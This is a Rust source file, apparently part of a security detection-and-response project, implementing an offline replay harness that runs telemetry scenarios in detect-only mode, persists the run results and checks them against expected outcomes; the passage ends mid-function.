use crate::config::{RuntimeConfigError, load_config};
use crate::correlation::{CorrelationEngine, CorrelationError, CorrelationOutcome};
use crate::investigation::{InvestigationStrategy, SummaryInvestigator};
use crate::service::{EventExecutionContext, RuntimeMetricsSnapshot, RuntimeService, ServiceError};
use crate::{RuntimeMode, SwarmRuntime};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, RwLock};
use swarm_core::config::{CorrelationConfig, SwarmConfig};
use swarm_core::types::{AgentId, ResponseAction};
use swarm_pheromone::InMemoryPheromoneSubstrate;
use swarm_policy::static_gate::StaticApprovalGate;
use swarm_policy::{ApprovalContext, PolicyVerdict};
use swarm_response::adapters::SandboxExecutor;
use swarm_spine::{
    CorrelatedIncident, InvestigationBundle, InvestigationBundleStore, InvestigationStatus,
    InvestigationStoreError, MemoryIncidentStore, MemoryInvestigationBundleStore, ReplayBundle,
};
use swarm_whisker::{DetectionStrategy, SuspiciousProcessTreeDetector, TelemetryEvent};

/// Errors surfaced by offline replay and evaluation flows.
#[derive(Debug, thiserror::Error)]
pub enum ReplayHarnessError {
    #[error(transparent)]
    Config(#[from] RuntimeConfigError),

    #[error(transparent)]
    Service(#[from] ServiceError),

    #[error(transparent)]
    Correlation(#[from] CorrelationError),

    #[error(transparent)]
    InvestigationStore(#[from] InvestigationStoreError),

    #[error(transparent)]
    Store(#[from] ReplayRunStoreError),

    #[error("failed to read replay scenario `{path}`: {source}")]
    ScenarioRead {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay scenario `{path}`: {source}")]
    ScenarioParse {
        path: PathBuf,
        #[source]
        source: serde_yaml::Error,
    },

    #[error("invalid replay scenario `{path}`: {reason}")]
    ScenarioValidation { path: PathBuf, reason: String },

    #[error("failed to read replay bundle fixture `{path}`: {source}")]
    BundleRead {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay bundle fixture `{path}`: {source}")]
    BundleParse {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },

    #[error("unsupported detector strategy `{strategy}`")]
    UnsupportedDetector { strategy: String },
}

#[derive(Debug, Clone)]
enum SupportedDetector {
    SuspiciousProcessTree(SuspiciousProcessTreeDetector),
}

impl DetectionStrategy for SupportedDetector {
    fn id(&self) -> &str {
        match self {
            Self::SuspiciousProcessTree(detector) => detector.id(),
        }
    }

    fn evaluate(&self, event: &TelemetryEvent) -> Vec<swarm_whisker::DetectionFinding> {
        match self {
            Self::SuspiciousProcessTree(detector) => detector.evaluate(event),
        }
    }
}

/// Repo-owned replay scenario manifest.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayScenarioManifest {
    pub name: String,
    pub description: String,
    pub seed_time_ms: i64,
    pub requested_by: String,
    #[serde(default)]
    pub receipt_chain: Vec<String>,
    pub input: ReplayScenarioInput,
    #[serde(default)]
    pub expectations: ReplayExpectations,
}

/// Replay input source for one scenario.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ReplayScenarioInput {
    Events { events: Vec<ReplayScenarioStep> },
    ReplayBundles { paths: Vec<String> },
}

impl ReplayScenarioInput {
    fn kind(&self) -> ReplayInputKind {
        match self {
            Self::Events { .. } => ReplayInputKind::Events,
            Self::ReplayBundles { .. } => ReplayInputKind::ReplayBundles,
        }
    }
}

/// One replay step driven by a normalized telemetry event and requested response action.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayScenarioStep {
    pub action: ResponseAction,
    pub event: TelemetryEvent,
}

/// Expected outcomes for a replay scenario.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayExpectations {
    #[serde(default)]
    pub replay_bundle_count: Option<usize>,
    #[serde(default)]
    pub investigation_count: Option<usize>,
    #[serde(default)]
    pub incident_count: Option<usize>,
    #[serde(default)]
    pub hunts: Vec<ExpectedHuntOutcome>,
    #[serde(default)]
    pub incident_hunt_groups: Vec<Vec<String>>,
    #[serde(default)]
    pub max_detect_latency_us: Option<u64>,
    #[serde(default)]
    pub max_policy_latency_us: Option<u64>,
    #[serde(default)]
    pub max_response_latency_us: Option<u64>,
}

/// Expected outcome for one replay hunt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExpectedHuntOutcome {
    pub hunt_id: String,
    pub action_kind: String,
    pub policy_verdict: PolicyVerdict,
    pub response_kind: String,
}

/// Replay input type recorded in the durable result bundle.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReplayInputKind {
    Events,
    ReplayBundles,
}

/// Stable actual hunt outcome captured from one replay run.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ActualHuntOutcome {
    pub hunt_id: String,
    pub action_kind: String,
    pub policy_verdict: PolicyVerdict,
    pub response_kind: String,
}

/// Deterministic replay summary used for repeatability checks.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayDeterministicSummary {
    pub replay_bundle_count: usize,
    pub investigation_count: usize,
    pub incident_count: usize,
    pub hunts: Vec<ActualHuntOutcome>,
    pub incident_hunt_groups: Vec<Vec<String>>,
}

impl ReplayDeterministicSummary {
    fn from_outputs(
        replay_bundles: &[ReplayBundle],
        investigations: &[InvestigationBundle],
        incidents: &[CorrelatedIncident],
    ) -> Self {
        let mut hunts = replay_bundles
            .iter()
            .map(|bundle| ActualHuntOutcome {
                hunt_id: bundle.audit.hunt_id.clone(),
                action_kind: bundle.action_kind().to_string(),
                policy_verdict: bundle.audit.policy.verdict,
                response_kind: bundle.audit.response_kind().to_string(),
            })
            .collect::<Vec<_>>();
        hunts.sort_by(|left, right| left.hunt_id.cmp(&right.hunt_id));

        let mut incident_hunt_groups = incidents
            .iter()
            .map(|incident| {
                let mut hunt_ids = incident.included_hunt_ids();
                hunt_ids.sort();
                hunt_ids.dedup();
                hunt_ids
            })
            .collect::<Vec<_>>();
        incident_hunt_groups.sort();

        Self {
            replay_bundle_count: replay_bundles.len(),
            investigation_count: investigations.len(),
            incident_count: incidents.len(),
            hunts,
            incident_hunt_groups,
        }
    }
}

/// Durable replay result bundle written by the offline harness.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayRunBundle {
    pub run_id: String,
    pub scenario_name: String,
    pub scenario_path: String,
    pub description: String,
    pub input_kind: ReplayInputKind,
    pub seed_time_ms: i64,
    pub created_at_ms: i64,
    pub requested_by: String,
    pub expectations: ReplayExpectations,
    pub replay_bundles: Vec<ReplayBundle>,
    pub investigations: Vec<InvestigationBundle>,
    pub incidents: Vec<CorrelatedIncident>,
    pub deterministic_summary: ReplayDeterministicSummary,
    pub performance: RuntimeMetricsSnapshot,
}

/// Metadata surfaced for one persisted replay run.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayRunRecord {
    pub run_id: String,
    pub scenario_name: String,
    pub input_kind: ReplayInputKind,
    pub created_at_ms: i64,
    pub replay_bundle_count: usize,
    pub investigation_count: usize,
    pub incident_count: usize,
    pub bundle_path: String,
}

impl ReplayRunRecord {
    fn from_bundle(bundle: &ReplayRunBundle, bundle_path: String) -> Self {
        Self {
            run_id: bundle.run_id.clone(),
            scenario_name: bundle.scenario_name.clone(),
            input_kind: bundle.input_kind,
            created_at_ms: bundle.created_at_ms,
            replay_bundle_count: bundle.deterministic_summary.replay_bundle_count,
            investigation_count: bundle.deterministic_summary.investigation_count,
            incident_count: bundle.deterministic_summary.incident_count,
            bundle_path,
        }
    }
}

/// Persisted replay run loaded with metadata.
#[derive(Debug, Clone)]
pub struct ReplayRunLookup {
    pub record: ReplayRunRecord,
    pub bundle: ReplayRunBundle,
}

/// Health summary for the replay run store.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayRunStoreHealth {
    pub backend: String,
    pub durable: bool,
    pub ready: bool,
    pub stored_runs: usize,
    pub details: String,
}

/// Replay run store errors.
#[derive(Debug, thiserror::Error)]
pub enum ReplayRunStoreError {
    #[error("replay run store lock poisoned")]
    PoisonedLock,

    #[error("failed to read replay run store file `{path}`: {source}")]
    Read {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to write replay run store file `{path}`: {source}")]
    Write {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay run store file `{path}`: {source}")]
    Parse {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },
}

/// Store contract for durable replay runs.
pub trait ReplayRunStore: Send + Sync {
    fn persist(&self, bundle: &ReplayRunBundle) -> Result<ReplayRunRecord, ReplayRunStoreError>;
    fn load_by_run_id(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayRunStoreError>;
    fn recent(&self, limit: usize) -> Result<Vec<ReplayRunRecord>, ReplayRunStoreError>;
    fn health(&self) -> Result<ReplayRunStoreHealth, ReplayRunStoreError>;
}

/// In-memory replay run store used by tests.
#[derive(Debug, Clone, Default)]
pub struct MemoryReplayRunStore {
    bundles: Arc<RwLock<Vec<ReplayRunBundle>>>,
}

impl ReplayRunStore for MemoryReplayRunStore {
    fn persist(&self, bundle: &ReplayRunBundle) -> Result<ReplayRunRecord, ReplayRunStoreError> {
        let mut guard = self
            .bundles
            .write()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        guard.retain(|existing| existing.run_id != bundle.run_id);
        guard.push(bundle.clone());
        Ok(ReplayRunRecord::from_bundle(bundle, "memory".to_string()))
    }

    fn load_by_run_id(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayRunStoreError> {
        let guard = self
            .bundles
            .read()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        Ok(guard
            .iter()
            .find(|bundle| bundle.run_id == run_id)
            .cloned()
            .map(|bundle| ReplayRunLookup {
                record: ReplayRunRecord::from_bundle(&bundle, "memory".to_string()),
                bundle,
            }))
    }

    fn recent(&self, limit: usize) -> Result<Vec<ReplayRunRecord>, ReplayRunStoreError> {
        let guard = self
            .bundles
            .read()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        let mut entries = sorted_recent_runs(&guard)
            .into_iter()
            .map(|bundle| ReplayRunRecord::from_bundle(&bundle, "memory".to_string()))
            .collect::<Vec<_>>();
        entries.truncate(limit);
        Ok(entries)
    }

    fn health(&self) -> Result<ReplayRunStoreHealth, ReplayRunStoreError> {
        let guard = self
            .bundles
            .read()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        Ok(ReplayRunStoreHealth {
            backend: "memory".to_string(),
            durable: false,
            ready: true,
            stored_runs: guard.len(),
            details: "ephemeral in-process replay run store".to_string(),
        })
    }
}

/// File-backed replay run store used by the operator CLI and CI flows.
#[derive(Debug, Clone)]
pub struct FileReplayRunStore {
    root: PathBuf,
}

impl FileReplayRunStore {
    pub fn open(path: impl AsRef<Path>) -> Result<Self, ReplayRunStoreError> {
        let root = path.as_ref().to_path_buf();
        fs::create_dir_all(root.join("runs")).map_err(|source| ReplayRunStoreError::Write {
            path: root.clone(),
            source,
        })?;
        Ok(Self { root })
    }

    fn run_path(&self, run_id: &str) -> PathBuf {
        self.root
            .join("runs")
            .join(format!("{}.json", sanitize_id(run_id)))
    }

    fn index_path(&self) -> PathBuf {
        self.root.join("index.json")
    }

    fn read_index(&self) -> Result<ReplayRunIndex, ReplayRunStoreError> {
        let path = self.index_path();
        if !path.exists() {
            return Ok(ReplayRunIndex::default());
        }
        let raw = fs::read_to_string(&path).map_err(|source| ReplayRunStoreError::Read {
            path: path.clone(),
            source,
        })?;
        serde_json::from_str(&raw).map_err(|source| ReplayRunStoreError::Parse { path, source })
    }

    fn write_index(&self, index: &ReplayRunIndex) -> Result<(), ReplayRunStoreError> {
        let path = self.index_path();
        let raw =
            serde_json::to_string_pretty(index).map_err(|source| ReplayRunStoreError::Parse {
                path: path.clone(),
                source,
            })?;
        fs::write(&path, raw).map_err(|source| ReplayRunStoreError::Write { path, source })
    }
}

impl ReplayRunStore for FileReplayRunStore {
    fn persist(&self, bundle: &ReplayRunBundle) -> Result<ReplayRunRecord, ReplayRunStoreError> {
        let path = self.run_path(&bundle.run_id);
        let raw =
            serde_json::to_string_pretty(bundle).map_err(|source| ReplayRunStoreError::Parse {
                path: path.clone(),
                source,
            })?;
        fs::write(&path, raw).map_err(|source| ReplayRunStoreError::Write {
            path: path.clone(),
            source,
        })?;

        let mut index = self.read_index()?;
        let record = ReplayRunRecord::from_bundle(bundle, path.display().to_string());
        index.entries.retain(|entry| entry.run_id != record.run_id);
        index.entries.push(record.clone());
        index
            .entries
            .sort_by_key(|entry| std::cmp::Reverse(entry.created_at_ms));
        self.write_index(&index)?;
        Ok(record)
    }

    fn load_by_run_id(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayRunStoreError> {
        let index = self.read_index()?;
        let Some(record) = index
            .entries
            .iter()
            .find(|entry| entry.run_id == run_id)
            .cloned()
        else {
            return Ok(None);
        };
        let path = PathBuf::from(&record.bundle_path);
        let raw = fs::read_to_string(&path).map_err(|source| ReplayRunStoreError::Read {
            path: path.clone(),
            source,
        })?;
        let bundle = serde_json::from_str(&raw).map_err(|source| ReplayRunStoreError::Parse {
            path: path.clone(),
            source,
        })?;
        Ok(Some(ReplayRunLookup { record, bundle }))
    }

    fn recent(&self, limit: usize) -> Result<Vec<ReplayRunRecord>, ReplayRunStoreError> {
        let mut entries = self.read_index()?.entries;
        entries.truncate(limit);
        Ok(entries)
    }

    fn health(&self) -> Result<ReplayRunStoreHealth, ReplayRunStoreError> {
        let entries = self.read_index()?.entries;
        Ok(ReplayRunStoreHealth {
            backend: "local_files".to_string(),
            durable: true,
            ready: true,
            stored_runs: entries.len(),
            details: format!("replay run bundles persisted under {}", self.root.display()),
        })
    }
}

/// One replay evaluation check.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayEvaluationCheck {
    pub name: String,
    pub passed: bool,
    pub expected: serde_json::Value,
    pub actual: serde_json::Value,
    pub details: String,
}

/// Full evaluation report for one replay run.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayEvaluationReport {
    pub run_id: String,
    pub scenario_name: String,
    pub passed: bool,
    pub checks: Vec<ReplayEvaluationCheck>,
    pub deterministic_summary: ReplayDeterministicSummary,
    pub performance: RuntimeMetricsSnapshot,
}

/// Suite-level replay evaluation report across a tracked scenario directory.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplaySuiteReport {
    pub scenarios_dir: String,
    pub total_scenarios: usize,
    pub passed_scenarios: usize,
    pub failed_scenarios: usize,
    pub passed: bool,
    pub reports: Vec<ReplayEvaluationReport>,
}

/// Offline replay harness that reuses the production Rust types without executing live actions.
pub struct DefaultReplayHarness {
    pub config_path: PathBuf,
    pub config: SwarmConfig,
    pub results_dir: PathBuf,
    detector: SupportedDetector,
    result_store: FileReplayRunStore,
}

impl DefaultReplayHarness {
    /// Build the harness from repository config plus a durable replay-results directory.
    pub fn from_path(
        config_path: impl AsRef<Path>,
        results_dir: impl AsRef<Path>,
    ) -> Result<Self, ReplayHarnessError> {
        let config_path = config_path.as_ref();
        let config = load_config(config_path)?;
        Self::from_config(config_path, config, results_dir)
    }

    /// Build the harness from an already-validated config.
    pub fn from_config(
        config_path: impl Into<PathBuf>,
        config: SwarmConfig,
        results_dir: impl AsRef<Path>,
    ) -> Result<Self, ReplayHarnessError> {
        let detector = supported_detector(&config)?;
        let result_store = FileReplayRunStore::open(results_dir.as_ref())?;
        Ok(Self {
            config_path: config_path.into(),
            config,
            results_dir: results_dir.as_ref().to_path_buf(),
            detector,
            result_store,
        })
    }

    /// Execute one scenario manifest, persist the result bundle, and return the durable lookup.
    pub async fn run_scenario_path(
        &self,
        scenario_path: impl AsRef<Path>,
    ) -> Result<ReplayRunLookup, ReplayHarnessError> {
        let loaded = load_scenario_manifest(scenario_path)?;
        let steps = self.materialize_steps(&loaded)?;

        let service = self.build_service();
        let substrate = InMemoryPheromoneSubstrate::new(self.config.pheromone.clone());
        let agent_id = AgentId(loaded.manifest.requested_by.clone());

        let mut replay_bundles = Vec::new();
        for (index, step) in steps.iter().enumerate() {
            let approval = ApprovalContext {
                live_mode: false,
                receipt_chain: loaded.manifest.receipt_chain.clone(),
                now_ms: loaded.manifest.seed_time_ms + index as i64,
            };
            let execution = EventExecutionContext {
                agent_id: &agent_id,
                approval: &approval,
            };

            if let Some(bundle) = service
                .process_event(&self.detector, &substrate, &step.event, execution, |_| {
                    Some(step.action.clone())
                })
                .await?
            {
                replay_bundles.push(bundle);
            }
        }

        let investigation_store = MemoryInvestigationBundleStore::default();
        let investigations = self
            .run_inline_investigations(
                &investigation_store,
                &replay_bundles,
                loaded.manifest.seed_time_ms + 10_000,
            )
            .await?;
        let incidents = self
            .run_inline_correlation(&investigation_store, loaded.manifest.seed_time_ms + 20_000)?;
        let deterministic_summary =
            ReplayDeterministicSummary::from_outputs(&replay_bundles, &investigations, &incidents);

        let run_bundle = ReplayRunBundle {
            run_id: run_id_for_manifest(&loaded.manifest),
            scenario_name: loaded.manifest.name.clone(),
            scenario_path: loaded.path.display().to_string(),
            description: loaded.manifest.description.clone(),
            input_kind: loaded.manifest.input.kind(),
            seed_time_ms: loaded.manifest.seed_time_ms,
            created_at_ms: loaded.manifest.seed_time_ms,
            requested_by: loaded.manifest.requested_by.clone(),
            expectations: loaded.manifest.expectations.clone(),
            replay_bundles,
            investigations,
            incidents,
            deterministic_summary,
            performance: service.metrics_snapshot(),
        };
        let record = self.result_store.persist(&run_bundle)?;

        Ok(ReplayRunLookup {
            record,
            bundle: run_bundle,
        })
    }

    /// Load a persisted replay run by its stable run id.
    pub fn load_run(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayHarnessError> {
        Ok(self.result_store.load_by_run_id(run_id)?)
    }

    /// Load a persisted replay run using the stable run id derived from a scenario manifest.
    pub fn load_run_for_scenario_path(
        &self,
        scenario_path: impl AsRef<Path>,
    ) -> Result<Option<ReplayRunLookup>, ReplayHarnessError> {
        let loaded = load_scenario_manifest(scenario_path)?;
        self.load_run(&run_id_for_manifest(&loaded.manifest))
    }

    /// Execute one scenario and immediately evaluate the result bundle.
    pub async fn evaluate_scenario_path(
        &self,
        scenario_path: impl AsRef<Path>,
    ) -> Result<ReplayEvaluationReport, ReplayHarnessError> {
        let lookup = self.run_scenario_path(scenario_path).await?;
        Ok(self.evaluate_run(&lookup.bundle))
    }

    /// Evaluate every tracked scenario in one directory and aggregate the results.
    pub async fn evaluate_scenarios_dir(
        &self,
        scenarios_dir: impl AsRef<Path>,
    ) -> Result<ReplaySuiteReport, ReplayHarnessError> {
        let scenarios_dir = scenarios_dir.as_ref().to_path_buf();
        let scenario_paths = scenario_paths_in_dir(&scenarios_dir)?;
        if scenario_paths.is_empty() {
            return Err(ReplayHarnessError::ScenarioValidation {
                path: scenarios_dir,
                reason: "scenario directory did not contain any .yaml scenarios".to_string(),
            });
        }

        let mut reports = Vec::with_capacity(scenario_paths.len());
        for scenario_path in scenario_paths {
            reports.push(self.evaluate_scenario_path(scenario_path).await?);
        }

        let passed_scenarios = reports.iter().filter(|report| report.passed).count();
        let failed_scenarios = reports.len().saturating_sub(passed_scenarios);
        Ok(ReplaySuiteReport {
            scenarios_dir: scenarios_dir.display().to_string(),
            total_scenarios: reports.len(),
            passed_scenarios,
            failed_scenarios,
            passed: failed_scenarios == 0,
            reports,
        })
    }

    /// Evaluate one persisted or freshly-executed replay run against repo-owned expectations.
    pub fn evaluate_run(&self, run: &ReplayRunBundle) -> ReplayEvaluationReport {
        let mut checks = Vec::new();
        let summary = &run.deterministic_summary;

        if let Some(expected) = run.expectations.replay_bundle_count {
            checks.push(equality_check(
                "replay_bundle_count",
                json!(expected),
                json!(summary.replay_bundle_count),
                "replay bundle count matched expected scenario output",
            ));
        }
        if let Some(expected) = run.expectations.investigation_count {
            checks.push(equality_check(
                "investigation_count",
                json!(expected),
                json!(summary.investigation_count),
                "investigation bundle count matched expected scenario output",
            ));
        }
        if let Some(expected) = run.expectations.incident_count {
            checks.push(equality_check(
                "incident_count",
                json!(expected),
                json!(summary.incident_count),
                "incident count matched expected scenario output",
            ));
        }

        for expected in &run.expectations.hunts {
            let actual = summary
                .hunts
                .iter()
                .find(|outcome| outcome.hunt_id == expected.hunt_id);
            let (passed, actual_value, details) = match actual {
                Some(actual) => {
                    let actual_value = json!({
                        "action_kind": actual.action_kind,
                        "policy_verdict": actual.policy_verdict,
                        "response_kind": actual.response_kind,
                    });
                    let passed = actual.action_kind == expected.action_kind
                        && actual.policy_verdict == expected.policy_verdict
                        && actual.response_kind == expected.response_kind;
                    let details = if passed {
                        format!(
                            "hunt `{}` matched expected action, policy, and response",
                            expected.hunt_id
                        )
                    } else {
                        format!(
                            "hunt `{}` diverged from expected action, policy, or response",
                            expected.hunt_id
                        )
                    };
                    (passed, actual_value, details)
                }
                None => (
                    false,
                    serde_json::Value::Null,
                    format!(
                        "hunt `{}` was not present in replay output",
                        expected.hunt_id
                    ),
                ),
            };
            checks.push(ReplayEvaluationCheck {
                name: format!("hunt:{}", expected.hunt_id),
                passed,
                expected: json!({
                    "action_kind": expected.action_kind,
                    "policy_verdict": expected.policy_verdict,
                    "response_kind": expected.response_kind,
                }),
                actual: actual_value,
                details,
            });
        }

        if !run.expectations.incident_hunt_groups.is_empty() {
            checks.push(equality_check(
                "incident_hunt_groups",
                json!(normalize_groups(&run.expectations.incident_hunt_groups)),
                json!(normalize_groups(&summary.incident_hunt_groups)),
                "incident hunt group membership matched replay expectations",
            ));
        }

        if let Some(expected) = run.expectations.max_detect_latency_us {
            checks.push(latency_check(
                "max_detect_latency_us",
                expected,
                run.performance.detect.max_latency_us,
            ));
        }
        if let Some(expected) = run.expectations.max_policy_latency_us {
            checks.push(latency_check(
                "max_policy_latency_us",
                expected,
                run.performance.policy.max_latency_us,
            ));
        }
        if let Some(expected) = run.expectations.max_response_latency_us {
            checks.push(latency_check(
                "max_response_latency_us",
                expected,
                run.performance.response.max_latency_us,
            ));
        }

        let passed = checks.iter().all(|check| check.passed);
        ReplayEvaluationReport {
            run_id: run.run_id.clone(),
            scenario_name: run.scenario_name.clone(),
            passed,
            checks,
            deterministic_summary: summary.clone(),
            performance: run.performance.clone(),
        }
    }

    fn build_service(&self) -> RuntimeService<StaticApprovalGate, SandboxExecutor> {
        let mut offline_config = self.config.clone();
        offline_config.runtime.mode = RuntimeMode::DetectOnly;
        offline_config.runtime.require_durable_live_response = false;
        let runtime = SwarmRuntime::new(
            RuntimeMode::DetectOnly,
            StaticApprovalGate {
                human_gate_severity: offline_config.policy.human_gate_severity,
                lease_ttl_ms: offline_config.policy.lease_ttl_ms,
            },
            SandboxExecutor,
        );
        RuntimeService::new(offline_config, runtime)
    }

    fn materialize_steps(
        &self,
        loaded: &LoadedReplayScenario,
    ) -> Result<Vec<ReplayScenarioStep>, ReplayHarnessError> {
        match &loaded.manifest.input {
            ReplayScenarioInput::Events { events } => Ok(events.clone()),
            ReplayScenarioInput::ReplayBundles { paths } => {
                let mut steps = Vec::with_capacity(paths.len());
                for path in paths {
                    let resolved = resolve_relative_path(&loaded.path, path);
                    let raw = fs::read_to_string(&resolved).map_err(|source| {
                        ReplayHarnessError::BundleRead {
                            path: resolved.clone(),
                            source,
                        }
                    })?;
                    let bundle: ReplayBundle = serde_json::from_str(&raw).map_err(|source| {
                        ReplayHarnessError::BundleParse {
                            path: resolved.clone(),
                            source,
                        }
                    })?;
                    steps.push(ReplayScenarioStep {
                        action: bundle.action_request.action,
                        event: bundle.event,
                    });
                }
                Ok(steps)
            }
        }
    }

    async fn run_inline_investigations(
        &self,
        store: &MemoryInvestigationBundleStore,
        replay_bundles: &[ReplayBundle],
        base_time_ms: i64,
    ) -> Result<Vec<InvestigationBundle>, ReplayHarnessError> {
        let investigator = SummaryInvestigator;
        let mut investigations = Vec::with_capacity(replay_bundles.len());

        for (index, replay) in replay_bundles.iter().enumerate() {
            let queued_at_ms = base_time_ms + index as i64 * 10;
            let started_at_ms = queued_at_ms + 1;
            let completed_at_ms = queued_at_ms + 2;
            let investigation_id =
                format!("investigation:{}:{}", replay.audit.hunt_id, queued_at_ms);
            let queued =
                InvestigationBundle::queued_from_bundle(replay, investigation_id, queued_at_ms);
            let running =
                queued.with_status(InvestigationStatus::Running, Some(started_at_ms), None);
            let terminal = match investigator.investigate(replay).await {
                Ok(outcome) => {
                    let mut completed = running.with_summary(
                        outcome.summary,
                        outcome.evidence_points,
                        outcome.correlation_keys,
                        completed_at_ms,
                    );
                    completed.started_at_ms = Some(started_at_ms);
                    completed
                }
                Err(reason) => {
                    let mut failed =
                        running.with_failure(InvestigationStatus::Failed, reason, completed_at_ms);
                    failed.started_at_ms = Some(started_at_ms);
                    failed
                }
            };
            store.persist(&terminal)?;
            investigations.push(terminal);
        }

        Ok(investigations)
    }

    fn run_inline_correlation(
        &self,
        investigation_store: &MemoryInvestigationBundleStore,
        base_time_ms: i64,
    ) -> Result<Vec<CorrelatedIncident>, ReplayHarnessError> {
        let engine = CorrelationEngine::new(offline_correlation_config(&self.config));
        let incident_store = MemoryIncidentStore::default();
        let investigations = investigation_store.recent(usize::MAX)?;
        let mut ordered_hunts = investigations
            .iter()
            .map(|record| record.hunt_id.clone())
            .collect::<Vec<_>>();
        ordered_hunts.sort();
        ordered_hunts.dedup();

        let mut covered_hunts = Vec::<String>::new();
        let mut incidents = Vec::new();
        for (index, hunt_id) in ordered_hunts.into_iter().enumerate() {
            if covered_hunts.iter().any(|existing| existing == &hunt_id) {
                continue;
            }
            let maybe_outcome = engine.correlate_hunt_at(
                investigation_store,
                &incident_store,
                &hunt_id,
                base_time_ms + index as i64,
            )?;
            if let Some(CorrelationOutcome { incident, .. }) = maybe_outcome {
                for included_hunt_id in incident.included_hunt_ids() {
                    if !covered_hunts
                        .iter()
                        .any(|existing| existing == &included_hunt_id)
                    {
                        covered_hunts.push(included_hunt_id);
                    }
                }
                incidents.push(incident);
            }
        }
        incidents.sort_by(|left, right| left.incident_id.cmp(&right.incident_id));
        Ok(incidents)
    }
}

/// Render one replay run in a concise operator-friendly format.
pub fn render_replay_run(run: &ReplayRunBundle) -> String {
    let mut lines = vec![
        "Swarm Team Six Replay Run".to_string(),
        format!("Scenario: {}", run.scenario_name),
        format!("Run: {}", run.run_id),
        format!("Source: {:?}", run.input_kind),
        format!(
            "Bundles: {} | investigations: {} | incidents: {}",
            run.deterministic_summary.replay_bundle_count,
            run.deterministic_summary.investigation_count,
            run.deterministic_summary.incident_count
        ),
    ];

    if !run.deterministic_summary.hunts.is_empty() {
        lines.push("Hunts:".to_string());
        for hunt in &run.deterministic_summary.hunts {
            lines.push(format!(
                "- {} action={} verdict={:?} response={}",
                hunt.hunt_id, hunt.action_kind, hunt.policy_verdict, hunt.response_kind
            ));
        }
    }

    if !run.deterministic_summary.incident_hunt_groups.is_empty() {
        lines.push("Incident groups:".to_string());
        for group in &run.deterministic_summary.incident_hunt_groups {
            lines.push(format!("- {}", group.join(", ")));
        }
    }

    lines.join("\n")
}

/// Render one evaluation report for operator review or CI failure output.
pub fn render_evaluation_report(report: &ReplayEvaluationReport) -> String {
    let mut lines = vec![
        "Swarm Team Six Replay Evaluation".to_string(),
        format!("Scenario: {}", report.scenario_name),
        format!("Run: {}", report.run_id),
        format!("Status: {}", if report.passed { "pass" } else { "fail" }),
    ];

    for check in &report.checks {
        lines.push(format!(
            "- [{}] {} | expected={} actual={} | {}",
            if check.passed { "pass" } else { "fail" },
            check.name,
            check.expected,
            check.actual,
            check.details
        ));
    }

    lines.join("\n")
}

/// Render a whole-suite replay evaluation report.
pub fn render_suite_report(report: &ReplaySuiteReport) -> String {
    let mut lines = vec![
        "Swarm Team Six Replay Suite".to_string(),
        format!("Scenarios: {}", report.scenarios_dir),
        format!("Status: {}", if report.passed { "pass" } else { "fail" }),
        format!(
            "Totals: {} total | {} passed | {} failed",
            report.total_scenarios, report.passed_scenarios, report.failed_scenarios
        ),
    ];

    for scenario_report in &report.reports {
        lines.push(format!(
            "- {} [{}]",
            scenario_report.scenario_name,
            if scenario_report.passed {
                "pass"
            } else {
                "fail"
            }
        ));
        for check in scenario_report.checks.iter().filter(|check| !check.passed) {
            lines.push(format!(
                "  failing check: {} | expected={} actual={} | {}",
                check.name, check.expected, check.actual, check.details
            ));
        }
    }

    lines.join("\n")
}

fn supported_detector(config: &SwarmConfig) -> Result<SupportedDetector, ReplayHarnessError> {
    match config.detection.strategy.as_str() {
        "suspicious_process_tree" => Ok(SupportedDetector::SuspiciousProcessTree(
            SuspiciousProcessTreeDetector::new(
                config.detection.high_confidence_threshold,
                config.detection.medium_confidence_threshold,
            ),
        )),
        other => Err(ReplayHarnessError::UnsupportedDetector {
            strategy: other.to_string(),
        }),
    }
}

fn equality_check(
    name: &str,
    expected: serde_json::Value,
    actual: serde_json::Value,
    success_details: &str,
) -> ReplayEvaluationCheck {
    let passed = expected == actual;
    ReplayEvaluationCheck {
        name: name.to_string(),
        passed,
        expected,
        actual,
        details: if passed {
            success_details.to_string()
        } else {
            format!("{name} did not match expected replay output")
        },
    }
}

fn latency_check(name: &str, expected_max: u64, actual_max: u64) -> ReplayEvaluationCheck {
    let passed = actual_max <= expected_max;
    ReplayEvaluationCheck {
        name: name.to_string(),
        passed,
        expected: json!(expected_max),
        actual: json!(actual_max),
        details: if passed {
            format!("{name} stayed within configured replay threshold")
        } else {
